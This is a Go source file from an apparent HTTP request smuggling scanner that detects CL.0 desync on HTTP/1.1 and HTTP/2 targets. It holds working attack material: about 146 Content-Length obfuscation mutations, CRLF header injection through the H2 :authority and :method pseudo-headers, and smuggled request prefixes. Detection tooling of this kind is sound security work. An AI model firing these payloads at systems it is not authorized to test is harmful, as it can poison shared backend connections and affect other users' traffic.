package scan

// cl0.go — CL.0 (Content-Length: 0) desync detection
//
// Three detection strategies:
//
//   1. Gadget bleed (CONFIRMED): marker from the smuggled request leaks into
//      a subsequent response — proves the backend treated the body as a new request.
//
//   2. Status divergence (PROBABLE): the probe response status differs from the
//      baseline after the smuggle — the smuggled prefix altered backend routing.
//      Adapted from CLZero (github.com/Moopinger/CLZero).
//
//   3. Status 400 potential: CL mutation causes 400 where baseline was 2xx,
//      only when body is present — the server may be parsing body as a new request.
//
// Connection modes (in order of speed):
//
//   - Last-byte-sync: open probe connection first, send all but last byte;
//     send full smuggle on second connection; fire last byte of probe.
//     Maximizes chance of catching the poisoned backend connection.
//
//   - Skip-read: send smuggle without reading response, immediately send probe.
//     Faster than sequential, good for most targets.
//
//   - Sequential (fallback): send smuggle, read response, send probe.

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/permute"
	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/request"
)

// cl0Gadget represents a candidate smuggled inner-request used to confirm CL.0.
// The gadget is fired directly to verify it produces a distinctive response,
// then used as the smuggled body in the attack. If the probe response reflects
// the gadget marker, the backend demonstrably processed the smuggled request.
type cl0Gadget struct {
	payload        string // request-line to inject as smuggled prefix
	lookFor        string // marker to search for in the follow-up probe response
	headerOnly     bool   // true = only search in response headers, not body
	responseStatus int    // HTTP status the gadget itself returns (0 = unknown/fallback)
}

// clGadgets are the static candidate inner-requests for CL.0 gadget detection,
// listed in priority order (most distinctive / cheapest first).
// A dynamic canary-path gadget is prepended at runtime in selectCL0Gadget.
var clGadgets = []cl0Gadget{
	{"GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1", "wrtztrw", false, 0},
	{"GET /robots.txt HTTP/1.1", "llow:", false, 0},
	{"GET /favicon.ico HTTP/1.1", "image/", true, 0},
	// "405 " (trailing space) avoids false positives from UUIDs/IDs containing
	// "405" as a substring (e.g. x-request-id: ...-9405-...).
	{"TRACE / HTTP/1.1", "405 ", true, 0},
	{"GET / HTTP/2.2", "505 ", true, 0},
}

// cl0TraceGadget is the TRACE fallback used when no other gadget is viable.
// Defined separately so ScanCL0 and ScanH2CL0 can reference it by name
// rather than by index (index 3 = TRACE in the static list above).
var cl0TraceGadget = &clGadgets[3]

// clMutation is a single Content-Length obfuscation technique.
type clMutation struct {
	name   string
	mutate func(req []byte, clVal string) []byte
}

// allCLMutations returns the complete list of CL.0 mutation techniques:
//   - 12 existing techniques (CL-plus, CL-minus, CL-pad, etc.)
//   - 4 CLZero-derived static techniques (CL-alpha, CL-subtract, CL-under, CL-smashed)
//   - 130 CLZero dynamic byte-family techniques (10 families × 13 byte values)
//
// Total: ~146 techniques per scan.
func allCLMutations() []clMutation {
	// Helper: wrap ApplyCL call into a closure capturing the technique name.
	cl := func(name string) clMutation {
		return clMutation{name, func(r []byte, v string) []byte {
			return permute.ApplyCL(r, name, v)
		}}
	}

	out := []clMutation{
		// ── Existing techniques ───────────────────────────────────────────────
		cl("CL-plus"),
		cl("CL-minus"),
		cl("CL-pad"),
		cl("CL-bigpad"),
		cl("CL-e"),
		cl("CL-dec"),
		cl("CL-commaprefix"),
		cl("CL-commasuffix"),
		cl("CL-error"),
		cl("CL-spacepad"),
		cl("CL-expect"),
		cl("CL-expect-obfs"),

		// ── Dual CL header attacks ────────────────────────────────────────────
		// Two Content-Length headers with conflicting values — RFC 7230 §3.3.2 says
		// reject; proxies and back-ends disagree on which one wins.
		cl("CL-dual-zero-first"), // CL: 0\r\nCL: <n> — front takes first, back takes last
		cl("CL-dual-zero-last"),  // CL: <n>\r\nCL: 0 — front takes last, back takes first

		// ── Header injection / obs-fold techniques ────────────────────────────
		// Source: Burp Suite HTTP Request Smuggler CL.0 scanner (observed payloads).
		cl("CL-none"),             // No Content-Length at all — pure CL.0
		cl("CL-connection-strip"), // Connection: Content-Length → proxy strips CL
		cl("CL-badsetupCR"),       // Foo: bar\rContent-Length: <n> — bare CR injection
		cl("CL-badsetupLF"),       // Foo: bar\nContent-Length: <n> — bare LF injection
		cl("CL-0dwrap"),           // Foo: bar\r\n\rContent-Length: <n> — CR after obs-fold
		cl("CL-nameprefix1"),      // Foo: bar\r\n Content-Length: <n> — obs-fold space
		cl("CL-nameprefix2"),      // Foo: bar\r\n\tContent-Length: <n> — obs-fold tab
		cl("CL-range"),            // Range: bytes=0-0 added after CL

		// ── CLZero-derived static techniques ─────────────────────────────────
		// Source: github.com/Moopinger/CLZero/blob/main/configs/default.py
		cl("CL-alpha"),    // Content-Length: <n>aa ("normalize" in CLZero)
		cl("CL-subtract"), // Content-Length: <n>-0 ("subtract" in CLZero)
		cl("CL-under"),    // Content_Length: <n>   ("underjoin1" in CLZero)
		cl("CL-smashed"),  // Content Length:<n>    ("smashed" in CLZero)
	}

	// ── CLZero dynamic byte-family techniques ─────────────────────────────────
	// 10 position families × 13 byte values = 130 permutations.
	clFamilies := []string{
		"CL-midspace",   // Content-Length:<byte><value>
		"CL-postspace",  // Content-Length<byte>: <value>
		"CL-prespace",   // <byte>Content-Length: <value>
		"CL-endspace",   // Content-Length: <value><byte>
		"CL-xprespace",  // X: X<byte>Content-Length: <value>
		"CL-endspacex",  // Content-Length: <value><byte>X: X
		"CL-rxprespace", // X: X\r<byte>Content-Length: <value>
		"CL-xnprespace", // X: X<byte>\nContent-Length: <value>
		"CL-endspacerx", // Content-Length: <value>\r<byte>X: X
		"CL-endspacexn", // Content-Length: <value><byte>\nX: X
	}
	for _, b := range permute.CLZeroBytes() {
		sfx := fmt.Sprintf("-%02x", b)
		for _, fam := range clFamilies {
			out = append(out, cl(fam+sfx))
		}
	}

	return out
}

// ScanCL0 runs CL.0 desync detection with all CL mutation techniques.
func ScanCL0(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("CL0")
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	dbg(cfg, "starting, target=%s path=%s", host, path)

	method := config.EffectiveMethod(cfg, true)
	basePost := request.BuildKeepAliveRequest(method, path, host)

	// Build a clean probe request (Connection: close GET to same path)
	probeReq := request.BuildGETRequest("GET "+path+" HTTP/1.1", host)

	// Establish baseline using probeReq (GET), not basePost (POST).
	// Detection 2 compares probe status against baseline — if baseline uses a
	// different method (POST → 404) but probe is GET (→ 200), the divergence
	// is a method difference, not a CL.0 signal.
	baseResp, _, _, _ := request.RawRequest(target, probeReq, cfg)
	baseStatus := request.StatusCode(baseResp)
	dbg(cfg, "baseline status=%d", baseStatus)
	if isRateLimited(baseStatus) {
		rep.Log("CL.0: baseline returned %d (rate limited), skipping %s", baseStatus, host)
		return
	}

	// Detect which gadget is viable
	gadget := selectCL0Gadget(target, basePost, cfg, rep)
	if gadget == nil {
		dbg(cfg, "no viable gadget found, using TRACE fallback")
		rep.Log("CL.0: no viable gadget found for %s, using TRACE fallback", host)
		gadget = cl0TraceGadget
	} else {
		dbg(cfg, "selected gadget payload=%q marker=%q", gadget.payload, gadget.lookFor)
	}

	canary := "YzBqvXxSmuggled"
	smuggledPrefix := fmt.Sprintf("%s\r\nX-%s: ", gadget.payload, canary)

	for _, mut := range allCLMutations() {
		if !techniqueEnabled(mut.name, cfg) {
			continue
		}
		dbg(cfg, "[%s]: starting, gadget=%q", mut.name, gadget.payload)
		rep.Log("CL.0 probe: technique=%s gadget=%s target=%s", mut.name, gadget.payload, host)

		// Build attack: body = smuggled prefix, CL mutated to look like 0
		clVal := fmt.Sprintf("%d", len(smuggledPrefix))
		attackReq := request.SetBody(basePost, smuggledPrefix)
		attackReq = request.SetContentLength(attackReq, len(smuggledPrefix))
		attackReq = mut.mutate(attackReq, clVal)

		for i := 0; i < cfg.Attempts; i++ {
			// ── Phase 1: Try last-byte-sync (best precision) ─────────
			probeResp, _, probeTimeout, probeErr := request.LastByteSyncProbe(
				target, attackReq, probeReq, cfg)

			if probeErr != nil || probeTimeout {
				dbg(cfg, "[%s]: last-byte-sync attempt %d err=%v timeout=%v, trying skip-read",
					mut.name, i, probeErr, probeTimeout)

				// ── Phase 2: Fallback to skip-read ───────────────────
				if err := request.SendNoRecv(target, attackReq, cfg); err != nil {
					dbg(cfg, "[%s]: skip-read send error: %v", mut.name, err)
					break
				}
				probeResp, _, probeTimeout, probeErr = request.RawRequest(target, probeReq, cfg)
				if probeErr != nil || probeTimeout {
					dbg(cfg, "[%s]: skip-read probe failed: err=%v timeout=%v", mut.name, i, probeErr, probeTimeout)
					break
				}
			}

			probeStatus := request.StatusCode(probeResp)
			dbg(cfg, "[%s]: attempt %d probeStatus=%d probeLen=%d",
				mut.name, i, probeStatus, len(probeResp))

			// ── Detection 1: Gadget bleed (CONFIRMED) ────────────────
			if gadgetMatches(probeResp, gadget) {
				dbg(cfg, "[%s]: CONFIRMED gadget bleed at attempt %d", mut.name, i)
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityConfirmed,
					Type:     "CL.0",
					Technique: mut.name + "|" + gadget.payload,
					Description: fmt.Sprintf(
						"CL.0 desync confirmed: after %d attempts with technique '%s', "+
							"response reflected gadget marker '%s' from smuggled prefix.",
						i, mut.name, gadget.lookFor),
					Evidence: fmt.Sprintf("attempt=%d smuggled_prefix=%q probe_status=%d", i, smuggledPrefix, probeStatus),
					RawProbe: request.Truncate(string(attackReq), 512),
				})
				if cfg.ExitOnFind {
					return
				}
				break // found for this mutation — move to next
			}

			// ── Detection 2: Status divergence (PROBABLE) ────────────
			// Guard: probe status must match the gadget's own response status.
			// In genuine CL.0 poisoning the probe receives the smuggled request's
			// response — so its status should equal what the gadget returned when
			// fired directly. A different status (e.g. probe=200, gadget=404) means
			// the probe got its own response, not the smuggled one (Cloudflare FP pattern).
			// When gadget.responseStatus == 0 (TRACE fallback), skip the guard.
			gadgetStatusMatch := gadget.responseStatus == 0 || probeStatus == gadget.responseStatus
			if i > 0 && baseStatus > 0 && probeStatus > 0 &&
				probeStatus != baseStatus && probeStatus != 429 && gadgetStatusMatch {
				dbg(cfg, "[%s]: status divergence at attempt %d: base=%d probe=%d gadget_expected=%d",
					mut.name, i, baseStatus, probeStatus, gadget.responseStatus)

				// Unstable-baseline guard: send a clean probe (no preceding smuggle).
				// If it returns the same status AND same body length as the diverged
				// probe, the server is non-deterministic for this endpoint — the
				// divergence is not caused by smuggling.
				// Body length is measured directly (Content-Length may be absent).
				cleanCheck, _, cleanTimeout, cleanErr := request.RawRequest(target, probeReq, cfg)
				if cleanErr == nil && !cleanTimeout &&
					request.StatusCode(cleanCheck) == probeStatus &&
					len(cleanCheck) == len(probeResp) {
					dbg(cfg, "[%s]: clean probe returns %d len=%d (same as probe) — unstable baseline FP, skipping",
						mut.name, probeStatus, len(cleanCheck))
					break
				}

				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   config.EffectiveMethods(cfg)[0],
					Severity: report.SeverityProbable,
					Type:     "CL.0-divergence",
					Technique: mut.name,
					Description: fmt.Sprintf(
						"CL.0 status divergence: technique '%s' caused probe status %d "+
							"(baseline: %d) after %d smuggle attempts. The smuggled prefix "+
							"may have altered backend routing.",
						mut.name, probeStatus, baseStatus, i),
					Evidence: fmt.Sprintf("baseline=%d probe=%d attempt=%d", baseStatus, probeStatus, i),
					RawProbe: request.Truncate(string(attackReq), 512),
				})
				if cfg.ExitOnFind {
					return
				}
				break // found for this mutation — move to next
			}

			// ── Detection 3: Status 400 potential ────────────────────
			if i > 0 && baseStatus > 0 && baseStatus < 400 && probeStatus == 400 {
				// Verify: mutation with harmless body should NOT cause 400
				fakeReq := request.SetBody(basePost, " ")
				fakeReq = request.SetContentLength(fakeReq, 1)
				fakeReq = mut.mutate(fakeReq, "1")
				allGood := true
				for k := 0; k < 5; k++ {
					fr, _, _, ferr := request.RawRequest(target, fakeReq, cfg)
					if ferr != nil || request.StatusCode(fr) == 400 {
						allGood = false
						break
					}
				}
				if allGood {
					rep.Emit(report.Finding{
						Target:   target.String(),
						Method:   config.EffectiveMethods(cfg)[0],
						Severity: report.SeverityProbable,
						Type:     "CL.0-potential",
						Technique: mut.name,
						Description: fmt.Sprintf(
							"Potential CL.0: technique '%s' caused status 400 (baseline: %d) "+
								"only when smuggled body is present.",
							mut.name, baseStatus),
						Evidence: fmt.Sprintf("baseline=%d probe=400 attempt=%d", baseStatus, i),
					})
					if cfg.ExitOnFind {
						return
					}
				}
			}
		}
	}
}

// ScanH2CL0 is the HTTP/2 variant of ScanCL0, delivering the same CL.0 attack
// via H2→H1 downgrade using forbidden or malformed headers (matches Burp Suite scanner).
//
// Mechanism:
//   - "Connection: keep-alive" is a hop-by-hop header forbidden in HTTP/2 (RFC 7540 §8.1.2.2).
//     Some front-ends forward it verbatim during H2→H1 downgrade.
//   - "Expect: x 100-continue" is malformed. Some H1 back-ends treat the request as
//     body-less when Expect is unrecognised, leaving the DATA frame bytes in the TCP buffer.
//   - Those buffered bytes are then parsed as the first line of the next H1 request (CL.0).
//
// Detection: same gadget-bleed strategy as ScanCL0 — use selectCL0Gadget to find a
// viable gadget, send the attack with the gadget as body, probe with a clean H2 GET,
// and check if the probe response reflects the gadget marker or diverges in status.
func ScanH2CL0(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2CL0")
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2CL0: %s does not negotiate h2, skipping", target.Host)
		return
	}

	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	// Reuse the same H1 gadget selection: test each candidate path directly
	// to find one whose response is distinctive and not present in baseline.
	baseReq := request.BuildKeepAliveRequest("GET", path, host)
	gadget := selectCL0Gadget(target, baseReq, cfg, rep)
	if gadget == nil {
		dbg(cfg, "H2CL0: no viable gadget found, using TRACE fallback")
		rep.Log("H2CL0: no viable gadget found for %s, using TRACE fallback", host)
		gadget = cl0TraceGadget
	} else {
		dbg(cfg, "H2CL0: selected gadget payload=%q marker=%q", gadget.payload, gadget.lookFor)
	}

	// smuggledBody = incomplete H1 request prefix; the absorber header (X-YzBqv:)
	// swallows the first line of the real next request, completing the injection cleanly.
	smuggledBody := fmt.Sprintf("%s\r\nX-YzBqv: ", gadget.payload)

	// Baseline via H2 to detect status divergence
	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
	if err != nil || baseline.Status == 0 {
		dbg(cfg, "H2CL0: baseline failed: %v", err)
		return
	}
	baseStatus := baseline.Status
	dbg(cfg, "H2CL0: baseline status=%d gadget=%q", baseStatus, gadget.payload)
	if isRateLimited(baseStatus) {
		rep.Log("H2CL0: baseline returned %d (rate limited), skipping %s", baseStatus, host)
		return
	}

	// Header permutations — each isolates a specific CL.0 trigger mechanism.
	// Mirrors the exact techniques observed in Burp Suite's H2 CL.0 scanner.
	//
	// Key insight from Burp's payloads:
	//   - Burp does NOT use Connection: keep-alive in H2 (forbidden per RFC 7540 §8.1.2.2).
	//     Instead it uses X-Connection: keep-alive (a custom header, forwarded by some proxies).
	//   - Burp does NOT use Expect: headers in H2 CL.0 scans.
	//   - The actual CL.0 mechanism is content-length: 0 in the H2 HEADERS frame while the
	//     DATA frame still carries the smuggled body prefix.
	headerPerms := []struct {
		name  string
		extra map[string]string
	}{
		{
			// Primary Burp technique: X-Connection + CL=0.
			// content-length: 0 tells the back-end the request has no body;
			// the DATA frame bytes remain in the TCP buffer → CL.0.
			"x-connection/cl-zero",
			map[string]string{
				"x-connection":   "keep-alive",
				"content-length": "0",
			},
		},
		{
			// Burp variant: X-Connection + no CL header.
			// No content-length at all; the back-end infers body absence → CL.0.
			"x-connection/no-cl",
			map[string]string{
				"x-connection":   "keep-alive",
				"content-length": "", // sentinel: suppress CL header
			},
		},
		{
			// Bare CL=0 without X-Connection.
			// Some front-ends strip X-Connection; this covers those that just see CL=0.
			"bare/cl-zero",
			map[string]string{
				"content-length": "0",
			},
		},
		{
			// Bare no-CL: omit content-length entirely, no hop-by-hop tricks.
			"bare/no-cl",
			map[string]string{
				"content-length": "", // suppress
			},
		},
	}

	for _, method := range config.EffectiveMethods(cfg) {
		for _, perm := range headerPerms {
			if !techniqueEnabled("H2.CL0/"+perm.name, cfg) {
				continue
			}
			rep.Log("H2CL0 probe: method=%s perm=%s gadget=%s target=%s",
				method, perm.name, gadget.payload, host)
			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q", method, perm.name, smuggledBody)

			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, cfg, rep) {
				return
			} else if !cfg.ExitOnFind {
				h2cl0runPerm(target, method, path, host, smuggledBody, perm.extra, perm.name, gadget, baseStatus, cfg, rep)
			}
		}

		// ── H2 pseudo-header injection techniques ────────────────────────────
		// Burp also probes CL injection via H2 :authority and :method pseudo-headers.
		// When the front-end downgrades H2→H1, the crafted pseudo-header value may
		// produce a non-numeric Content-Length in the H1 request, triggering CL.0
		// on the back-end ("48x" is invalid → parsed as 0 by some implementations).
		//
		// The injected CL string uses "<n>x: x" where <n> is the real body length.
		// The trailing "x: x" makes the injected text look like an additional header
		// field to parsers that stop at the first non-numeric character of the CL value.
		bodyLen := len(smuggledBody)
		port := target.Port()
		if port == "" {
			port = "443"
		}

		pseudoInjects := []struct {
			name  string
			extra map[string]string
		}{
			{
				// :authority injection: the \r\n terminates the Host header value and
				// injects a non-numeric Content-Length as a separate H1 header.
				// When the H2→H1 front-end naively uses the :authority value as the
				// Host header, the back-end sees:
				//   Host: <host>:443\r\n
				//   Content-Length: <n>x: x\r\n
				// The non-numeric CL value triggers CL.0 on the back-end.
				"authority-inject",
				map[string]string{
					":authority":     fmt.Sprintf("%s:%s\r\nContent-Length: %dx: x", target.Hostname(), port, bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "", // suppress actual CL
				},
			},
			{
				// :method raw injection: method pseudo-header terminates the H1 request
				// line with \r\n and injects a non-numeric Content-Length as a header.
				// When the H2→H1 front-end naively uses the :method value as the request
				// line, the back-end sees:
				//   POST / HTTP/1.1\r\n
				//   Content-Length: <n>x: x\r\n
				// The non-numeric CL value triggers CL.0 on the back-end.
				"method-inject-raw",
				map[string]string{
					":method":        fmt.Sprintf("POST / HTTP/1.1\r\nContent-Length: %dx: x", bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "",
				},
			},
			{
				// :method URL-encoded injection: same as above but with percent-encoding.
				// Some H2 implementations decode %20 before constructing the H1 request,
				// making this equivalent to the raw variant on those targets.
				// Others forward the encoded form verbatim, which the back-end may then
				// decode — either way producing a non-numeric CL.
				"method-inject-urlenc",
				map[string]string{
					":method":        fmt.Sprintf("POST%%20/%%20HTTP/1.1%%0D%%0AContent-Length:%%20%dx:%%20x", bodyLen),
					"x-connection":   "keep-alive",
					"content-length": "",
				},
			},
		}

		for _, inj := range pseudoInjects {
			if !techniqueEnabled("H2.CL0/"+inj.name, cfg) {
				continue
			}
			rep.Log("H2CL0 pseudo-inject: method=%s perm=%s gadget=%s target=%s",
				method, inj.name, gadget.payload, host)
			dbg(cfg, "H2CL0 [%s/%s]: smuggled=%q bodyLen=%d", method, inj.name, smuggledBody, bodyLen)

			if cfg.ExitOnFind && h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, cfg, rep) {
				return
			} else if !cfg.ExitOnFind {
				h2cl0runPerm(target, method, path, host, smuggledBody, inj.extra, inj.name, gadget, baseStatus, cfg, rep)
			}
		}
	}
}

// h2cl0runPerm executes a single H2 CL.0 permutation across cfg.Attempts attempts.
// Returns true if a finding was emitted (used with ExitOnFind to short-circuit).
func h2cl0runPerm(
	target *url.URL, method, path, host, smuggledBody string,
	extra map[string]string, permName string,
	gadget *cl0Gadget, baseStatus int,
	cfg config.Config, rep *report.Reporter,
) bool {
	for attempt := 0; attempt < cfg.Attempts; attempt++ {
		// Single-connection probe: attack on stream 1, probe GET on stream 3.
		// Both streams share the same H2→back-end TCP connection.
		_, probe, err := h2AttackAndProbe(target, method, path, host, smuggledBody, extra, cfg)
		if err != nil {
			dbg(cfg, "H2CL0 [%s/%s]: attempt %d error: %v", method, permName, attempt, err)
			continue
		}
		if probe.Status == 0 {
			dbg(cfg, "H2CL0 [%s/%s]: attempt %d probe status=0, skipping", method, permName, attempt)
			continue
		}

		probeStatus := probe.Status

		// Collect probe bytes for gadget matching.
		var probeBytes []byte
		if gadget.headerOnly {
			for _, hf := range probe.Headers {
				probeBytes = append(probeBytes, []byte(hf.Name+": "+hf.Value+"\r\n")...)
			}
		} else {
			probeBytes = probe.Body
		}
		gadgetFound := request.ContainsStr(probeBytes, gadget.lookFor)

		dbg(cfg, "H2CL0 [%s/%s]: attempt %d probeStatus=%d baseline=%d gadget=%v",
			method, permName, attempt, probeStatus, baseStatus, gadgetFound)

		// ── Detection 1: gadget marker reflected (CONFIRMED) ─────────────
		if gadgetFound {
			dbg(cfg, "H2CL0 [%s/%s]: CONFIRMED gadget bleed at attempt %d", method, permName, attempt)
			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:    "HTTP/2",
				Severity:  report.SeverityConfirmed,
				Type:      "H2.CL0",
				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
				Description: fmt.Sprintf(
					"H2 CL.0 desync confirmed (single-connection): technique '%s' caused "+
						"the H2→H1 downgrade to leave the DATA body in the TCP buffer. "+
						"Back-end parsed it as a new request; probe on stream 3 reflected "+
						"gadget marker '%s' from '%s' (method=%s, attempt=%d).",
					permName, gadget.lookFor, gadget.payload, method, attempt),
				Evidence: fmt.Sprintf("attempt=%d gadget=%q marker=%q probe_status=%d baseline=%d",
					attempt, gadget.payload, gadget.lookFor, probeStatus, baseStatus),
				RawProbe: fmt.Sprintf(
					"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
						"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
					method, path, host, extra, len(smuggledBody), smuggledBody, path, host),
			})
			return true
		}

		// ── Detection 2: status divergence (PROBABLE) ────────────────────
		// Same guard as H1: probe status must match gadget's own response status.
		gadgetStatusMatch := gadget.responseStatus == 0 || probeStatus == gadget.responseStatus
		if attempt > 0 && probeStatus != baseStatus && probeStatus != 429 && gadgetStatusMatch {
			dbg(cfg, "H2CL0 [%s/%s]: status divergence at attempt %d: base=%d probe=%d gadget_expected=%d",
				method, permName, attempt, baseStatus, probeStatus, gadget.responseStatus)
			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:    "HTTP/2",
				Severity:  report.SeverityProbable,
				Type:      "H2.CL0",
				Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
				Description: fmt.Sprintf(
					"H2 CL.0 desync (single-connection): probe on stream 3 returned "+
						"status %d vs baseline %d after %d attempts "+
						"(technique=%s, method=%s). The smuggled prefix may have "+
						"altered back-end routing on the shared connection.",
					probeStatus, baseStatus, attempt, permName, method),
				Evidence: fmt.Sprintf("attempt=%d probe_status=%d baseline=%d",
					attempt, probeStatus, baseStatus),
				RawProbe: fmt.Sprintf(
					"[stream 1] %s %s HTTP/2\r\nHost: %s\r\n%v\r\ncontent-length: %d\r\n\r\n%s\n"+
						"[stream 3] GET %s HTTP/2\r\nHost: %s\r\n",
					method, path, host, extra, len(smuggledBody), smuggledBody, path, host),
			})
			return true
		}
	}
	return false
}

// selectCL0Gadget fires each gadget request directly to find one whose
// response is distinctive and not already present in baseline responses.
//
// The canary path (cfg.CanaryPath) is prepended as a high-priority dynamic
// gadget: many servers echo the requested path in 404 error pages, making
// the canary string a reliable and unique marker.
func selectCL0Gadget(target *url.URL, baseReq []byte, cfg config.Config, rep *report.Reporter) *cl0Gadget {
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}

	// Build the dynamic canary gadget. The marker is the path without the leading "/"
	// so it matches "smuggled-canary-xzyw" even when surrounded by other characters
	// (e.g. in "<a href="/smuggled-canary-xzyw">Not Found</a>").
	canaryPath := cfg.CanaryPath
	if canaryPath == "" {
		canaryPath = "/smuggled-canary-xzyw"
	}
	canaryMarker := strings.TrimPrefix(canaryPath, "/")
	canaryGadget := cl0Gadget{
		payload:    "GET " + canaryPath + " HTTP/1.1",
		lookFor:    canaryMarker,
		headerOnly: false,
	}

	// Candidates: canary gadget first (most distinctive), then static list.
	candidates := append([]cl0Gadget{canaryGadget}, clGadgets...)

	baseResp, _, _, _ := request.RawRequest(target, baseReq, cfg)

	for i := range candidates {
		g := &candidates[i]
		basePath := target.RequestURI()
		if basePath == "" {
			basePath = "/"
		}
		if strings.Contains(g.payload, basePath+" ") && basePath != "/" {
			continue
		}
		gadgetReq := request.BuildGETRequest(g.payload, host)
		resp, _, timedOut, err := request.RawRequest(target, gadgetReq, cfg)
		if err != nil || timedOut || len(resp) == 0 {
			continue
		}
		if baseResp != nil && request.ContainsStr(baseResp, g.lookFor) {
			continue
		}
		if !gadgetMatches(resp, g) {
			continue
		}
		g.responseStatus = request.StatusCode(resp)
		rep.Log("CL.0: selected gadget '%s' (marker=%q status=%d) for %s", g.payload, g.lookFor, g.responseStatus, host)
		return g
	}
	return nil
}

// gadgetMatches checks whether resp contains the gadget's marker string.
func gadgetMatches(resp []byte, g *cl0Gadget) bool {
	if g.headerOnly {
		end := len(resp)
		for i := 0; i < len(resp)-3; i++ {
			if resp[i] == '\r' && resp[i+1] == '\n' && resp[i+2] == '\r' && resp[i+3] == '\n' {
				end = i
				break
			}
		}
		return request.ContainsStr(resp[:end], g.lookFor)
	}
	return request.ContainsStr(resp, g.lookFor)
}
